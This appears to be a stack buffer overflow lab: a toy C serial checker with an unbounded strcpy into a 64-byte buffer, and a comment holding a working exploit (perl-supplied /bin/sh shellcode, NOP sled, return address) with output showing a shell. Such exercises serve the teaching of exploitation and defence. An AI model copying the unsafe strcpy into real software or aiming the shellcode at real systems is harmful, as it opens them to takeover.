#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_serial(char *serial) {
    int flag = 0;
    char serial_buff[64];
    strcpy(serial_buff, serial);
    if (strcmp(serial_buff, "SN123445") == 0) flag = 1;

    return flag;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Enter serial number!\n");
        exit(0);
    }

    if (check_serial(argv[1])) {
        printf("Serial number is correct.\n");
    } else {
        printf("Serial number is wrong.\n");
    }
}
/*
./hello $(perl -e 'print "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05" . "\x90"x59 . "\x60\xe3\xff\xff\xff\x7f"')
$ id
uid=1000(chris) gid=1000(chris) groups=1000(chris),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ 
*/
